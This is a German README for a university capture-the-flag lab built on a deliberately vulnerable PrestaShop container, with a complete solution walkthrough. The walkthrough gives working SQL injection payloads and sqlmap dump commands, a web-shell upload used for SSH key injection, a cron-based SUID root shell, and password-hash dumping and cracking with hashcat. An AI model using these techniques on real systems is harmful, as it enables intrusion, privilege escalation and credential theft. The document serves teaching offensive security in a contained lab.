# Dieses Repo ist eine CTF Demo im Rahmen des Bachelorstudiums für das Fach Offensive Security

Ziel des CTF ist es 4 Flags zu finden. Weiter unten befindet sich eine Musterlösung zum finden der Flags.

Die Flags haben immer folgendes Format:

    FLAG{Name_der_Flag}




# Setup & Installation

 **Repository klonen**  
   ```bash
   git clone https://github.com/DirkMe/CTF-Offsec ctf
   cd ctf

Ordnerstruktur:
 
    ctf/
    ├── docker-compose.yml
    ├── Dockerfile
    ├── cron-backup.sh
    ├── exampleshell.php    # Angehängt für Lernzwecke zum direkten Upload
    ├── docker/     
    |   ├── start.sh     
    |   └── flag_init.sh
    └── prestashop-1.5.6.2/            # PrestaShop + Module-Ordner
        └── modules/
            ├── ndk_steppingpack/     # SQLi-Modul für Flag 2
            └── orderfiles/           # File-Upload-Modul für Flag 3
            
Container starten

    docker compose build --no-cache
    docker compose up -d

in manchen Fällen startet der Container nicht weil die start.sh aus unbekannten Gründen nicht in den Container kopiert wird.

in dem Fall über die GitBash in Windows innerhalb des CTF Ordner öffnen und folgenden Befehl machen um die Zeilenendungen zu ändern

        dos2unix docker/*.sh

Für den Fall, dass es immer noch nicht funktioniert habe ich das fertige Dockerimage in einem Repository hochgeladen und wird von der docker-compose_v2.yml verwendet.




Falls das Fehlschlägt:

    docker compose -f docker-compose_v2.yml build --no-cache
    docker compose -f docker-compose_v2.yml up -d

Webshop: http://localhost:8080

Im Falle einer Installation mit externer IP muss sich im Adminportal 
http://\<IP-Adresse\>:8080/admin9625 angemeldet werden mit admin@example.com und Passwort: password

Unter Preferences --> SEO & URLs runterscrollen und unter Set shop URL die IP-Adresse+Port eintragen. Dann sollte der Container auch über die IP verfügbar sein aber nicht über localhost, da diese Einstellung jeder PHP Link auf die eingestellte Adresse weiterleitet.

# CTF Walkthrough

---

## Inhaltsverzeichnis

1. [Flag 1: Backup-Leak](#flag-1-backup-leak)  
2. [Flag 2: SQL-Injection im ndk_steppingpack](#flag-2-sql-injection-im-ndk_steppingpack)  
3. [Flag 3: SSH-Key Injection via File-Upload](#flag-3-ssh-key-injection-via-file-upload)  
4. [Flag 4: Privilege Escalation via Cron](#flag-4-privilege-escalation-via-cron)  

---

## Flag 1: Backup-Leak
Vulnerable Path:
backup/flag1.txt

z.B. Findbar durch 

    feroxbuser -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -x .txt

Exploit:

    curl http://localhost:8080/backup/flag1.txt


 
⇒ FLAG{Backup Leak}  Es gibt einen User auf dem Server mit dem Nutzernamen CTF


## Flag 2: SQL-Injection im ndk_steppingpack
Modul:
modules/ndk_steppingpack/
– Front-Controller quote mit ungefiltertem product_id

Zu finden im Header rechts oben als button mit dem Namen "Current Order" Gibt eine Json zurück und sieht mit dem URL Parameter nach möglichem SQL aus ==> **?product_id=1**

Test SQL Injection

    curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1"
    ⇒ [{"product_id":"1","data":"CTF-Pack-Demo"}]
    Spalten-Probe (2 Spalten: product_id,data):


nächster try ob UNION SELECT funktioniert

    curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,2%23"
    ⇒ [{"product_id":"1","data":"2"}]


Flag-Dump:

    curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,flag%20FROM%20prefix2_0ctf_flags%23"


⇒ [{"product_id":"1","data":"FLAG{SQLI_SUCCESS}"}]

⇒FLAG{SQLI_SUCCESS}

(Optional mit sqlmap:)

z.B. auch DB komplett auslesbar über SQLMap welche Tabellen existieren und dadurch Infos sammeln.

    sqlmap -u "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1" \
       -p product_id --dbms mysql --batch --union-cols=2 \
       --dump -D cubecart -T prefix2_0ctf_flags


## Flag 3: SSH-Key Injection via File-Upload

Modul:
modules/orderfiles/ajax/upload.php
– unauth. Upload von exampleshell.php

Zu finden im Header rechts oben als button mit dem Namen "Upload File"
Beim klicken kommt folgende Nachricht:

Oops Something Went Wrong. Try again with curl and the orderfile


Exploit-Steps:

Shell hochladen 

    curl -F "file=@exampleshell.php;filename=exampleshell.php"      -F "auptype=product"      http://localhost:8080/modules/orderfiles/ajax/upload.php

gibt dann auch den Ablegeort zurück um dann auf diese zugreifen zu können

    {"ok":true,"path":"modules\/orderfiles\/data\/uploads\/exampleshell.php"}

Public-Key injizieren:

    curl -X POST --data-urlencode "key=$(<~/.ssh/id_ed25519.pub)"  http://localhost:8080/modules/orderfiles/data/uploads/exampleshell.php
⇒ "Key injected"
SSH-Login (Key-Only):

    ssh -i ~/.ssh/id_ed25519 -p 2222 ctf@localhost
Flag auslesen:

    cat ~/.ssh/flag3.txt   
    
 ⇒ FLAG{SSH_PERSISTENCE}

## Flag 4: Privilege Escalation via Cron
Mechanismus:
cron-backup.sh läuft jede Minute als root aber der Nutzer CTF hat Lese und Schreibzugriff darauf


Exploit-Steps:

Als ctf /usr/local/bin/cron-backup.sh überschreiben:


    cat > /usr/local/bin/cron-backup.sh <<'EOF'
    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash
    EOF
    chmod +x /usr/local/bin/cron-backup.sh

Warten (≤ 1 Minute) bis Cron läuft

Root-Shell nutzen:

    /tmp/rootbash -p
    cat /root/flag4.txt   

⇒ FLAG{CRON_ROOT}

## Zusammenfassung

Flag	Vector	Abruf-Kommando

#1	Backup-Leak in Backup Ordner	

    curl http://localhost:8080/backup/flag1.txt

#2	SQLi im ndk_steppingpack	siehe UNION-Exploit oben

#3	File-Upload → SSH-Key in authorized_keys

    curl -X POST --data-urlencode "key=$(<~/.ssh/id_ed25519.pub)"  http://localhost:8080/modules/orderfiles/data/uploads/exampleshell.php
    ssh -i ~/.ssh/id_ed25519 -p 2222 ctf@localhost

#4	PrivEsc via Cron	SUID-Shell /tmp/rootbash; dann cat /root/flag4.txt

## Viel Erfolg beim CTF!


# BONUS
## Knacken von Mitarbeiter und Kunden Accounts

PrestaShop 1.5 speichert das Passwort in der Datenbank als folgenden Hash:

    MD5( _COOKIE_KEY_ + KlartextPasswort )

Dabei kann man durch die SQL Injection mit SQLMap die Kunden oder Mitarbeitertabelle dumpen:

    sqlmap \
    -u "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1" \
    -p product_id \
    --batch \
    --dbms=mysql \
    -D cubecart \
    -T prefix2_0employee \
    -C email,passwd \
    --where "active=1" \
    --dump
 
bzw 

    sqlmap \
    -u "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1" \
    -p product_id \
    --batch \
    --dbms=mysql \
    -D cubecart \
    -T prefix2_0customer \
    -C email,passwd \
    --where "active=1" \
    --dump


Der Cookiekey wird in der config/settings.inc.php abgelegt. Über SSH Zugriff kommt man an diesen ebenfalls ran:

    grep "_COOKIE_KEY_" /var/www/html/config/settings.inc.php

Dann muss man nur noch eine TXT mit den Hashpaaren erstellen:

    <hash>:<cookie_key>

z.B.

    8435a9aa1b345cbfdde930ae2153b873:oKgrQhBqLgjkUfx8d2vvCXNxKZCGF1XeKMa5wBub46S7tJH9jpDFe4Cn

diesen kann man dann in Kali linux z.B. mit Hashcat bruteforcen

    hashcat -m 20 salted_hash.txt /usr/share/wordlists/rockyou.txt

